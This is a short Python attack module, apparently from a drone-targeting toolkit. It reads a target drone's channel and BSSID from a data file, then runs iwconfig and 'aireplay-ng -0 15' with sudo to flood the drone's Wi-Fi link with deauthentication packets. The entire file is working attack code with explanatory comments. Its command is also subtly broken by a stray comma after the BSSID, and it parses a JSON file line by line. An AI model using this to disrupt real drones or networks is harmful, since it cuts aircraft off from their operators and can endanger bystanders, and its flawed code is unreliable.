import os
from src.utils import sudo_exec

# Get path to project root directory (two levels up from this file)
project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
target_data_file = os.path.join(project_root, "data", "target_input_data.json")
target_info = None

# Intialize target drone data
with open(target_data_file, 'r') as file:
    target_info = file.readlines()

##################
## START MODULE ##
##################

# Targeting specific channel of target drone
sudo_exec(f"iwconfig wlan0 channel {target_info[4]}")

# Deauth attack command

# aireplay-ng
# -0 : Deauth attack
# 15 : Number of deauth packets to send
# -a : Target BSSID (MAC address)
# target_info[2].strip() : Target BSSID from input file
# wlan0 : Network interface to use

sudo_exec(f"aireplay-ng -0 15 -a {target_info[2].strip()}, wlan0")